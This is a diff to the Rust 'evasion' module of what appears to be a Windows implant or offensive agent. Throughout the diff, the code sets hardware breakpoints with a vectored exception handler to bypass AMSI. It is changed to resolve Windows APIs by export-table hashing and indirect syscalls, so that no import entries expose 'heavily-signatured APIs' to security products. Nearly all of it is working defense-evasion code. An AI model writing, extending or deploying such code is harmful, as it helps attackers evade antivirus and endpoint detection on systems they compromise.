@@ -68,16 +68,41 @@ unsafe extern "system" fn veh_handler(
 
 #[cfg(windows)]
 pub unsafe fn setup_hardware_breakpoints() {
-    use winapi::um::errhandlingapi::AddVectoredExceptionHandler;
     use winapi::um::handleapi::INVALID_HANDLE_VALUE;
-    use winapi::um::processthreadsapi::{
-        OpenThread, ResumeThread,
-        SuspendThread,
-    };
-    use winapi::um::tlhelp32::{
-        CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
-    };
     use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS, THREAD_ALL_ACCESS};
+
+    // ── Dynamic resolution helpers (no IAT entries) ──────────────────────
+    // VEH registration / removal and thread enumeration are resolved at
+    // runtime via PE export-table hashing so no import-table entries are
+    // created for these heavily-signatured APIs.
+
+    type AddVehFn = unsafe extern "system" fn(u32, Option<unsafe extern "system" fn(*mut winapi::um::winnt::EXCEPTION_POINTERS) -> i32>) -> *mut std::ffi::c_void;
+
+    let add_veh: Option<AddVehFn> = (|| unsafe {
+        let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
+        let hash = pe_resolve::hash_str(b"AddVectoredExceptionHandler\0");
+        let addr = pe_resolve::get_proc_address_by_hash(k32, hash)?;
+        Some(std::mem::transmute::<usize, AddVehFn>(addr))
+    })();
+
+    type CreateSnapshotFn = unsafe extern "system" fn(u32, u32) -> winapi::um::winnt::HANDLE;
+    type Thread32FirstFn = unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut winapi::um::tlhelp32::THREADENTRY32) -> i32;
+    type Thread32NextFn = unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut winapi::um::tlhelp32::THREADENTRY32) -> i32;
+
+    let (create_snapshot, thread32_first, thread32_next): (Option<CreateSnapshotFn>, Option<Thread32FirstFn>, Option<Thread32NextFn>) = (|| unsafe {
+        let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
+        let snap_hash = pe_resolve::hash_str(b"CreateToolhelp32Snapshot\0");
+        let first_hash = pe_resolve::hash_str(b"Thread32First\0");
+        let next_hash = pe_resolve::hash_str(b"Thread32Next\0");
+        let snap_addr = pe_resolve::get_proc_address_by_hash(k32, snap_hash)?;
+        let first_addr = pe_resolve::get_proc_address_by_hash(k32, first_hash)?;
+        let next_addr = pe_resolve::get_proc_address_by_hash(k32, next_hash)?;
+        Some((
+            std::mem::transmute::<usize, CreateSnapshotFn>(snap_addr),
+            std::mem::transmute::<usize, Thread32FirstFn>(first_addr),
+            std::mem::transmute::<usize, Thread32NextFn>(next_addr),
+        ))
+    })().unwrap_or((None, None, None));
 
     type NtGetContextThreadFn =
         unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
@@ -250,9 +275,11 @@ pub unsafe fn setup_hardware_breakpoints() {
 
     // Register our VEH first; store the handle so it can be removed later
     // via RemoveVectoredExceptionHandler (see disable_evasion).
-    let veh = AddVectoredExceptionHandler(1, Some(veh_handler));
-    if !veh.is_null() {
-        VEH_HANDLE.store(veh as usize, Ordering::Release);
+    if let Some(add_veh_fn) = add_veh {
+        let veh = add_veh_fn(1, Some(veh_handler));
+        if !veh.is_null() {
+            VEH_HANDLE.store(veh as usize, Ordering::Release);
+        }
     }
 
     // Propagate hardware breakpoints to all existing threads in the process
@@ -275,27 +302,43 @@ pub unsafe fn setup_hardware_breakpoints() {
         std::ptr::null_mut::<u64>() as u64,
     );
     let pid = pbi.unique_process_id as u32;
-    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    // TH32CS_SNAPTHREAD = 0x00000004
+    let snapshot = create_snapshot.map_or(INVALID_HANDLE_VALUE, |f| f(0x00000004, 0));
     if snapshot != INVALID_HANDLE_VALUE {
-        let mut te32: THREADENTRY32 = std::mem::zeroed();
-        te32.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
+        let mut te32: winapi::um::tlhelp32::THREADENTRY32 = std::mem::zeroed();
+        te32.dwSize = std::mem::size_of::<winapi::um::tlhelp32::THREADENTRY32>() as u32;
 
-        if Thread32First(snapshot, &mut te32) != 0 {
+        if thread32_first.map_or(0, |f| f(snapshot, &mut te32)) != 0 {
             loop {
                 if te32.th32OwnerProcessID == pid {
-                    let h_thread = OpenThread(THREAD_ALL_ACCESS, 0, te32.th32ThreadID);
-                    if !h_thread.is_null() {
-                        // (1) SuspendThread: returns -1 (0xFFFFFFFF) on failure.
-                        let suspend_count = SuspendThread(h_thread);
-                        if suspend_count == u32::MAX {
+                    // OpenThread → NtOpenThread (indirect syscall)
+                    let mut oa: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
+                    oa.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+                    let mut cid: [u64; 2] = [pid as u64, te32.th32ThreadID as u64];
+                    let mut h_thread: usize = 0;
+                    let open_ok = syscall!(
+                        "NtOpenThread",
+                        &mut h_thread as *mut _ as u64,
+                        THREAD_ALL_ACCESS as u64,
+                        &mut oa as *mut _ as u64,
+                        cid.as_mut_ptr() as u64,
+                    );
+                    let h_thread = h_thread as winapi::um::winnt::HANDLE;
+                    if open_ok.is_ok() && open_ok.unwrap() >= 0 && !h_thread.is_null() {
+                        // (1) SuspendThread → NtSuspendThread
+                        let mut prev_suspend: u32 = 0;
+                        let susp_status = syscall!(
+                            "NtSuspendThread",
+                            h_thread as u64,
+                            &mut prev_suspend as *mut u32 as u64,
+                        );
+                        if susp_status.is_err() || susp_status.unwrap() < 0 {
                             log::warn!(
-                                "evasion: SuspendThread failed for tid {} — skipping context modification",
+                                "evasion: NtSuspendThread failed for tid {} — skipping context modification",
                                 te32.th32ThreadID
                             );
                             let _ = syscall!("NtClose", h_thread as u64);
-                            // Continue to next thread; don't attempt context changes
-                            // on a thread we couldn't suspend.
-                            if Thread32Next(snapshot, &mut te32) == 0 {
+                            if thread32_next.map_or(0, |f| f(snapshot, &mut te32)) == 0 {
                                 break;
                             }
                             continue;
@@ -351,9 +394,10 @@ pub unsafe fn setup_hardware_breakpoints() {
                                 "evasion: GetThreadContext failed for tid {} — restoring suspension and skipping",
                                 te32.th32ThreadID
                             );
-                            ResumeThread(h_thread);
+                            // ResumeThread → NtResumeThread
+                            let _ = syscall!("NtResumeThread", h_thread as u64, 0u64);
                             let _ = syscall!("NtClose", h_thread as u64);
-                            if Thread32Next(snapshot, &mut te32) == 0 {
+                            if thread32_next.map_or(0, |f| f(snapshot, &mut te32)) == 0 {
                                 break;
                             }
                             continue;
@@ -440,24 +484,18 @@ pub unsafe fn setup_hardware_breakpoints() {
                             );
                         }
 
-                        // (4) ResumeThread: returns 0 if the thread was not previously
-                        // suspended, or -1 (0xFFFFFFFF) on error.
-                        let resume_result = ResumeThread(h_thread);
-                        if resume_result == u32::MAX {
+                        // (4) ResumeThread → NtResumeThread
+                        let resume_status = syscall!("NtResumeThread", h_thread as u64, 0u64);
+                        if resume_status.is_err() || resume_status.unwrap() < 0 {
                             log::error!(
-                                "evasion: ResumeThread failed for tid {} — thread may be left in suspended state!",
-                                te32.th32ThreadID
-                            );
-                        } else if resume_result == 0 {
-                            log::warn!(
-                                "evasion: ResumeThread returned 0 for tid {} — thread was not in suspended state",
+                                "evasion: NtResumeThread failed for tid {} — thread may be left in suspended state!",
                                 te32.th32ThreadID
                             );
                         }
                         let _ = syscall!("NtClose", h_thread as u64);
                     }
                 }
-                if Thread32Next(snapshot, &mut te32) == 0 {
+                if thread32_next.map_or(0, |f| f(snapshot, &mut te32)) == 0 {
                     break;
                 }
             }
@@ -546,7 +584,6 @@ pub fn hide_current_thread() {}
 /// any other thread that must also be covered by the HWBP bypass.
 #[cfg(windows)]
 pub unsafe fn apply_hwbp_to_current_thread() {
-    use winapi::um::processthreadsapi::{GetCurrentThread, GetThreadContext, SetThreadContext};
     use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS};
 
     let amsi = AMSI_ADDR.load(Ordering::Relaxed);
@@ -588,9 +625,11 @@ pub unsafe fn apply_hwbp_to_current_thread() {
         );
     }
 
+    // GetCurrentThread() pseudo-handle = (-1)
+    let h: winapi::um::winnt::HANDLE = (-1isize) as *mut _;
+
     let mut ctx: CONTEXT = std::mem::zeroed();
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-    let h = GetCurrentThread();
 
     // Save original context for restoration on verification failure.
     let mut orig_ctx: CONTEXT = std::mem::zeroed();
@@ -598,10 +637,12 @@ pub unsafe fn apply_hwbp_to_current_thread() {
     let orig_saved = if let Some(nt_get) = nt_get_ctx {
         let status = nt_get(h, &mut orig_ctx);
         if status >= 0 { true } else {
-            GetThreadContext(h, &mut orig_ctx) != 0
+            let s = syscall!("NtGetContextThread", h as u64, &mut orig_ctx as *mut _ as u64);
+            s.is_ok() && s.unwrap() >= 0
         }
     } else {
-        GetThreadContext(h, &mut orig_ctx) != 0
+        let s = syscall!("NtGetContextThread", h as u64, &mut orig_ctx as *mut _ as u64);
+        s.is_ok() && s.unwrap() >= 0
     };
 
     let mut ctx: CONTEXT = std::mem::zeroed();
@@ -611,15 +652,17 @@ pub unsafe fn apply_hwbp_to_current_thread() {
         let status = nt_get(h, &mut ctx);
         if status < 0 {
             log::warn!(
-                "evasion: apply_hwbp_to_current_thread: NtGetContextThread failed (status=0x{:08x}), falling back to GetThreadContext",
+                "evasion: apply_hwbp_to_current_thread: NtGetContextThread failed (status=0x{:08x}), falling back to syscall",
                 status as u32
             );
-            GetThreadContext(h, &mut ctx) != 0
+            let s = syscall!("NtGetContextThread", h as u64, &mut ctx as *mut _ as u64);
+            s.is_ok() && s.unwrap() >= 0
         } else {
             true
         }
     } else {
-        GetThreadContext(h, &mut ctx) != 0
+        let s = syscall!("NtGetContextThread", h as u64, &mut ctx as *mut _ as u64);
+        s.is_ok() && s.unwrap() >= 0
     };
 
     if !got_ctx {
@@ -637,15 +680,17 @@ pub unsafe fn apply_hwbp_to_current_thread() {
         let status = nt_set(h, &mut ctx);
         if status < 0 {
             log::warn!(
-                "evasion: apply_hwbp_to_current_thread: NtSetContextThread failed (status=0x{:08x}), falling back to SetThreadContext",
+                "evasion: apply_hwbp_to_current_thread: NtSetContextThread failed (status=0x{:08x}), falling back to syscall",
                 status as u32
             );
-            SetThreadContext(h, &ctx) != 0
+            let s = syscall!("NtSetContextThread", h as u64, &mut ctx as *mut _ as u64);
+            s.is_ok() && s.unwrap() >= 0
         } else {
             true
         }
     } else {
-        SetThreadContext(h, &ctx) != 0
+        let s = syscall!("NtSetContextThread", h as u64, &mut ctx as *mut _ as u64);
+        s.is_ok() && s.unwrap() >= 0
     };
 
     if !set_ok {
@@ -661,10 +706,12 @@ pub unsafe fn apply_hwbp_to_current_thread() {
     let verify_ok = if let Some(nt_get) = nt_get_ctx {
         let status = nt_get(h, &mut verify_ctx);
         if status >= 0 { true } else {
-            GetThreadContext(h, &mut verify_ctx) != 0
+            let s = syscall!("NtGetContextThread", h as u64, &mut verify_ctx as *mut _ as u64);
+            s.is_ok() && s.unwrap() >= 0
         }
     } else {
-        GetThreadContext(h, &mut verify_ctx) != 0
+        let s = syscall!("NtGetContextThread", h as u64, &mut verify_ctx as *mut _ as u64);
+        s.is_ok() && s.unwrap() >= 0
     };
 
     if !verify_ok
@@ -682,7 +729,8 @@ pub unsafe fn apply_hwbp_to_current_thread() {
             let _ = if let Some(nt_set) = nt_set_ctx {
                 nt_set(h, &mut orig_ctx)
             } else {
-                if SetThreadContext(h, &orig_ctx) != 0 { 0i32 } else { -1i32 }
+                let s = syscall!("NtSetContextThread", h as u64, &mut orig_ctx as *mut _ as u64);
+                if s.is_ok() && s.unwrap() >= 0 { 0i32 } else { -1i32 }
             };
         }
     }
@@ -700,13 +748,22 @@ pub unsafe fn apply_hwbp_to_current_thread() {
 /// are no longer bypassed.  Call from the agent shutdown path.
 #[cfg(windows)]
 pub unsafe fn disable_evasion() {
-    use winapi::um::errhandlingapi::RemoveVectoredExceptionHandler;
+    type RemoveVehFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> u32;
 
     let handle = VEH_HANDLE.load(Ordering::Acquire);
     if handle != 0 {
-        RemoveVectoredExceptionHandler(handle as *mut _);
+        // Resolve RemoveVectoredExceptionHandler dynamically from kernel32.
+        if let Some(k32) = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
+            if let Some(addr) = pe_resolve::get_proc_address_by_hash(
+                k32,
+                pe_resolve::hash_str(b"RemoveVectoredExceptionHandler\0"),
+            ) {
+                let remove_veh: RemoveVehFn = std::mem::transmute(addr);
+                remove_veh(handle as *mut _);
+                log::info!("evasion: VEH handler removed (handle={:#x})", handle);
+            }
+        }
         VEH_HANDLE.store(0, Ordering::Release);
-        log::info!("evasion: VEH handler removed (handle={:#x})", handle);
     }
 
     // Clear hardware breakpoint addresses so stale Dr0/Dr1 values no longer
